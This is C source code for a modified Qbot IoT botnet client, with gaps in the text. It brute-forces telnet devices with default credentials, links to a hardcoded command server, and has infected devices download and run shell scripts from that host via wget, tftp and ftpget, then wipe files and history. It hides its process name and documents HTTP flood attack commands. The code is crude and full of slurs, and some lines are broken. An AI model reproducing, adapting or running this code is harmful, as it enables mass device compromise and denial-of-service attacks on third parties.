/*
BUILD 2
LOAD A GOOD 200 BOTS FOR THE SCANNER TO FULLY EXECUTE
PLEASE NOOOOO PYTHON ROUTERS
Qbot Modified by Jonah
private void hackashit()
{
printf("Main Shit added\r\n");
system("Look at The telnet scanner... Way better execution and faster");
...
sleep(8);
printf("lil shit added");
system("Modified Botkill");
system("Looping Payload Function");//PRETTY ASS
system("Device Cleaner");
system("New Get build");
system("added python scanner lol");
}
//btw a lil side note the sh command is "MOVE"
//another note ghp flood command is "!* HTTP cancer.org GET/POST/HEAD PORT PATH TIME POWER" SO LIKE THIS
"!* HTTP cancer.org GET 80 / 60 200"
//THE KILL ATTACK COMMAND IS "!* STOP"
*/
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
...
#include <time.h>
#include <limits.h>
#define PRE_SET_SEX 15
#define SERVER_LIST_SEX (sizeof(hekkertelnet) / sizeof(unsigned char *))
#define PAD_RIGHTZ 1
#define PAD_Nefz 2
#define PRINT_HOE 12
#define CMD_IAN 255
#define CMD_WILLY 251
#define CMD_WONKER 252
#define CMD_DILDO 253
#define CMD_FAG 254
#define OPT_PGA 3
#define STD_PIGZ 75
#define BUFFER_BITCH 1024
#define PHI 0x9e3779b9
#define VERSION "Build 2.5"
#define NETIS "AA\x00\x00AAAA"
unsigned char *hekkertelnet[] = { "107.172.41.207" };
int Server_Botport = 3672;
char *usernames[] = {"telnet\0", "root\0", "root\0"};
char *passwords[] = {"telnet\0", "root\0", "\0"};
char* KGSVYGXA[] = {"BusyBox", "$", "#", (char*)0};
char* SGSGWUD[] = {":", "ogin", "sername", "assword", (char*)0};
char* bhuhwys[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0};
char* SGSGWUD2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "BusyBox", "$", "#", (char*)0};
char *hvgsgd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.172.41.207/Nefz.sh; chmod 777 Nefz.sh; sh Nefz.sh; tftp 107.172.41.207 -c get tftp11.sh; chmod 777 tftp11.sh; sh tftp11.sh; tftp -r tftp22.sh -g 107.172.41.207; chmod 777 tftp22.sh; sh tftp22.sh; rm -rf Nefz.sh tftp11.sh tftp22.sh; rm -rf *;history -c\r\n";
int initConnection();
int userID = 1;
...
{
unsigned char print_buf[PRINT_HOE];
...
unsigned char c;
switch (buf[1]) {
case CMD_IAN: /*dropped an extra 0xFF wh00ps*/ return 0;
case CMD_WILLY:
case CMD_WONKER:
case CMD_DILDO:
case CMD_FAG:
...
if (CMD_WONKER == buf[1]) c = CMD_FAG;
else if (CMD_FAG == buf[1]) c = CMD_WONKER;
else if (OPT_PGA == buf[1]) c = (buf[1] == CMD_DILDO ? CMD_WILLY : CMD_DILDO);
else c = (buf[1] == CMD_DILDO ? CMD_WONKER : CMD_FAG);
send(sock, &c, 1, MSG_NOSIGNAL);
...
if(randnum == 213)
{
szprintf(ip, "111.26.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 214)
{
szprintf(ip, "111.20.%d.%d", ipState[3], ipState[4]);
}
...
{
return contains_string(buffer, KGSVYGXA);
}
int contains_fail(char* buffer)
{
return contains_string(buffer, bhuhwys);
}
...
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
buffer = malloc(BUFFER_BITCH + 1);
memset(buffer, 0, BUFFER_BITCH + 1);
...
break;
case 2: {
if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_BITCH, SGSGWUD)) {
...
break;
case 6: {
if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_BITCH, SGSGWUD2)) {
fds[i].totalTimeout = time(NULL);
if(contains_fail(fds[i].sockbuf)) {
fds[i].state = 0; }
...
sprintf(payload2, "%s cd /var/; rm -rf tftp; wget http://107.172.41.207/tftp || tftp -r tftp -g 107.172.41.207; chmod 777 tftp; ./tftp; rm -rf tftp\x00", NETIS);
...
int i;
for(i = 0; i < 9; i++){
system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.172.41.207/Nefz.sh ; chmod 777 Nefz.sh; sh Nefz.sh; tftp 107.172.41.207 -c get tftp11.sh; chmod 777 tftp11.sh; sh tftp11.sh; tftp -r tftp22.sh -g 107.172.41.207; chmod 777 tftp22.sh; sh tftp22.sh; ftpget -v -u anonymous -p anonymous -P 21 107.172.41.207 ftp11.sh ftp11.sh; sh ftp11.sh; rm -rf Nefz.sh tftp11.sh tftp22.sh ftp11.sh;rm -rf *;history -c\r\n");
}
sleep(5);
}
//botkill
...
if(argc != 2)
{
HackerPrint(D1ckSucka, "PYTHON RANGE [1,2,3,4]");
return;
}
...
{
system("yum install python-paramiko -y;apt-get install python-paramiko -y;mkdir /.tmp;cd /.tmp;wget http://107.172.41.207/purge.py");
HackerPrint(D1ckSucka, "Installs For Python");
}
if(!strcmp(argv[1], "1"))
{
system("cd /.tmp;python purge.py 500 SATAN 1 3");
HackerPrint(D1ckSucka, "Conncted To Python Scanner");
}
if(!strcmp(argv[1], "2"))
{
system("cd /.tmp;python good2.py 1 LUCKY 1 1");
HackerPrint(D1ckSucka, "Conncted To Good.py Scanner");
}
if(!strcmp(argv[1], "3"))
{
system("cd /.tmp;python purge.py 500 B 122.3 3");
HackerPrint(D1ckSucka, "Conncted To Python Scanner");
}
}
...
if(D1ckSuckaz + 1 == SERVER_LIST_SEX) D1ckSuckaz = 0;
else D1ckSuckaz++;
strcpy(server, hekkertelnet[D1ckSuckaz]);
int port = 23 Server_Botport;
...
if(SERVER_LIST_SEX <= 0) return 0;
printf("BUILD %s:%s\n", getBuild(), inet_ntoa(ourIP));
strncpy(argv[0],"",strlen(argv[0]));
sprintf(argv[0], mynameis);
prctl(PRE_SET_SEX, (unsigned long) mynameis, 0, 0, 0);
...
HackerPrint(D1ckSucka, "\x1b[0;32mConnected | IP: %s | Type: %s | Version: %s", inet_ntoa(ourIP), getBuild(), VERSION);
char commBuf[4096];
int got = 0;
int i = 0;
